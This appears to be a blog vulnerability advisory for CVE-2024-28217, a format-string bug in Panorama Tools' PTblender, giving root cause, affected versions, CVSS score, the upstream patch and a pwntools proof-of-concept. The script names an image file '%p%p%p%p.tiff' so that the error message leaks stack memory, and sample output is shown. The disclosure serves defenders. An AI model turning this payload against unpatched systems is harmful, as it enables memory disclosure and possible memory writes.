<!DOCTYPE html>
<html
  lang="en"
  data-theme="light"
>
  <head>
     <title> @iosifache | CVE-2024-28217 </title>

    <meta charset="utf-8" />
    <meta name="generator" content="Pelican" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />

    <link
      rel="stylesheet"
      href="https://cdn.jsdelivr.net/npm/@picocss/pico@1/css/pico.min.css"
    />
    <link rel="stylesheet" href="/theme/css/style.css" />
    <link rel="preconnect" href="https://fonts.googleapis.com" />
    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin />
    <link
      href="https://fonts.googleapis.com/css2?family=Roboto+Slab:wght@100;300;400;500;700;800&display=swap"
      rel="stylesheet"
    />

    <link rel="icon" href="/theme/images/favicon.png" type="image/x-icon" />
           <meta name="tags" content="vulnerability-discovery" />
<meta name="tags" content="open-source" />
   </head>

  <body>
    <main class="container">
      <nav>
        <ul>
          <li>
            <strong>
              <a href="/"
                >@iosifache</a
              >
            </strong>
          </li>
        </ul>
        <ul>
          <li><a href="/">Articles</a></li>
          <li><a href="/oss">Open source</a></li>
          <li><a href="/talks">Talks</a></li>
          <li><a href="/podcasts">Podcasts</a></li>
          <li><a href="/about">About</a></li>
          <li><a href="/now">Now</a></li>
        </ul>
      </nav>
<h1 class="entry-title">
  <a
    href="/CVE-2024-28217.html"
    rel="bookmark"
    title="Permalink to CVE-2024-28217"
    >CVE-2024-28217</a
  >
</h1>
<div class="post-info">
  <b>Last updated</b>:
  <time class="published" datetime="2024-03-08T00:00:00+02:00">
    Fri 08 March 2024
  </time>
    <div class="tags">
    <b>Tags</b>:     <a href="/tag/vulnerability-discovery.html"
      ><small class="chip">vulnerability-discovery</small></a
    >
    <a href="/tag/open-source.html"
      ><small class="chip">open-source</small></a
    >
  </div>
</div>
<br /><br />
<h1>Summary</h1>
<p>A user-controlled format string in <code>ReadHistograms()</code> in Panorama Tools' <code>PTblender</code> <code>0.4</code> through <code>2.9.21</code> allows local users to crash the program, or read and write the memory via the filename of an image.</p>
<h1>Root cause analysis</h1>
<p>The <code>PrintError</code> variadic function takes a format string as the first parameter and is a proxy for <code>PrintErrorIntern</code>. The latter calls <code>vsnprintf(message, sizeof(message)-1, fmt, ap)</code>, where <code>fmt</code> can be user-controlled. The output is printed afterward in a <code>printf</code> call.</p>
<p>Having this in mind, one needs to call <code>PrintError</code> with a user-controlled input in order to trigger the format string vulnerability. By analysing the source code, it was deduced that the function is called in this fashion in multiple locations.</p>
<p><code>PTblender</code> was leveraged as it can produce the following call trace: 
 
1. <code>ColourBrightness.c:ColourBrightness()</code>;
2. <code>ColourBrightness.c:ReadHistograms</code>; and
3. <code>PrintError</code> with a tainted argument.</p>
<p><code>ReadHistograms</code> creates a <code>tempString2</code> string using <code>snprintf(tempString2, sizeof(tempString2)-1, "Could not open TIFF file [%s]", tempString)</code>. As <code>tempString</code> is user-controlled via <code>PTblender</code>'s arguments, it can contain control strings like <code>%s</code>, <code>%p</code>, and <code>%n</code>. They will be reflected in <code>tempString2</code>, which is used as an argument for <code>PrintError</code>, which triggers the format string vulnerability.</p>
<h1>CWEs</h1>
<ul>
<li>CWE-134: Use of Externally-Controlled Format String</li>
</ul>
<h1>Affected components and releases</h1>
<p>The affected function is <code>ReadHistograms()</code> from <code>ColourBrightness.c</code>, which is called when running the <code>PTblender</code> executable.</p>
<p><code>PTblender.c</code> and the vulnerable code from <code>ColourBrightness.c</code> were introduces in the revision 217. All subsequent releases after January 2006 (starting from <code>0.4</code>) are vulnerable.</p>
<p>The vulnerability was patched in <code>271b8ab4bd66</code> by removing the <code>snprintf</code> call before <code>PrintError</code>. The commit is embedded in the <code>2.9.22</code> release.</p>
<p>This being said, the versions are those between <code>&gt;=0.4</code> and <code>&lt;=2.9.21</code>.</p>
<h1>Attack vector</h1>
<p>An attacker must control the filename of the image supplied for processing to <code>PTblender</code>.</p>
<h1>Impact</h1>
<p>The format string attacks permit the attacker to interrupt <code>PTblender</code>'s functioning, read the memory of the process, or write to it.</p>
<h1>CVSS v3.1 vector</h1>
<ul>
<li>Vector: <code>AV:L/AC:L/PR:L/UI:R/S:U/C:L/I:L/A:H</code></li>
<li>Base score: 6.1</li>
</ul>
<h1>Steps to reproduce</h1>
<p>By running the above script, an error containing the stack's content will be printed:</p>
<div class="highlight"><pre><span></span><code><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="n">process</span><span class="p">,</span> <span class="n">ELF</span>
<span class="kn">import</span> <span class="nn">shutil</span>
<span class="kn">import</span> <span class="nn">os</span>

<span class="n">FORMAT_STRING</span> <span class="o">=</span> <span class="s2">&quot;%p%p%p%p&quot;</span>
<span class="n">FIRST_IMAGE_FILENAME</span> <span class="o">=</span> <span class="n">FORMAT_STRING</span> <span class="o">+</span> <span class="s2">&quot;.tiff&quot;</span>
<span class="n">SECOND_IMAGE_FILENAME</span> <span class="o">=</span> <span class="s2">&quot;backup.tiff&quot;</span>

<span class="n">shutil</span><span class="o">.</span><span class="n">copyfile</span><span class="p">(</span><span class="s2">&quot;image.tiff&quot;</span><span class="p">,</span> <span class="n">FIRST_IMAGE_FILENAME</span><span class="p">)</span>
<span class="n">shutil</span><span class="o">.</span><span class="n">copyfile</span><span class="p">(</span><span class="s2">&quot;image.tiff&quot;</span><span class="p">,</span> <span class="n">SECOND_IMAGE_FILENAME</span><span class="p">)</span>

<span class="n">p</span> <span class="o">=</span> <span class="n">process</span><span class="p">(</span>
    <span class="p">[</span>
        <span class="s2">&quot;/usr/bin/PTblender&quot;</span><span class="p">,</span>
        <span class="s2">&quot;-f&quot;</span><span class="p">,</span>
        <span class="s2">&quot;-p&quot;</span><span class="p">,</span>
        <span class="s2">&quot;mend&quot;</span><span class="p">,</span>
        <span class="n">FIRST_IMAGE_FILENAME</span><span class="p">,</span>
        <span class="n">SECOND_IMAGE_FILENAME</span><span class="p">,</span>
    <span class="p">]</span>
<span class="p">)</span>

<span class="n">os</span><span class="o">.</span><span class="n">remove</span><span class="p">(</span><span class="n">FIRST_IMAGE_FILENAME</span><span class="p">)</span>

<span class="n">output</span> <span class="o">=</span> <span class="n">p</span><span class="o">.</span><span class="n">recvall</span><span class="p">()</span><span class="o">.</span><span class="n">decode</span><span class="p">(</span><span class="s2">&quot;utf-8&quot;</span><span class="p">)</span>
<span class="nb">print</span><span class="p">(</span><span class="n">output</span><span class="p">)</span>
</code></pre></div>

<p>A run of the exploitation script on Ubuntu 22.04 LTS outputs the following:</p>
<p><code>bash 
$ python3 exploit.py 
[...]
PTblender Version 2.9.20 , originally written by Helmut Dersch, rewritten by Daniel M German
Output prefix 2 mend
TIFFOpen: %p%p%p%p.tiff: No such file or directory.
Could not open TIFF file [0xffffa9cbab58(nil)(nil)0x3ffffa7de4d20.tiff]
[...]</code></p>
<h1>Patch</h1>
<h2>Recommended to the maintainers</h2>
<p>As <code>PrintError</code> is intended to be called with a format string and multiple arguments, it can be gcc-annotated with <code>format</code>, such that the format argument is type checked during compilation. Please see <a class="external-links" href="https://gcc.gnu.org/onlinedocs/gcc-9.2.0/gcc/Common-Function-Attributes.html#index-Wformat-3"> gcc's documentation</a>.</p>
<h2>Applied by the maintainers</h2>
<p>The vulnerability was patched in <a class="external-links" href="https://sourceforge.net/p/panotools/libpano13/ci/271b8ab4bd662605f96969cc7362bb466d21a1d3/">the commit <code>271b8a</code></a> by removing the <code>snprintf</code> calls before the <code>PrintError</code> ones.</p>
<p>The patch was made available to the users in <a class="external-links" href="https://sourceforge.net/projects/panotools/files/libpano13/libpano13-2.9.22/">the <code>2.9.22</code> release</a>.</p>     </main>
  </body>
</html>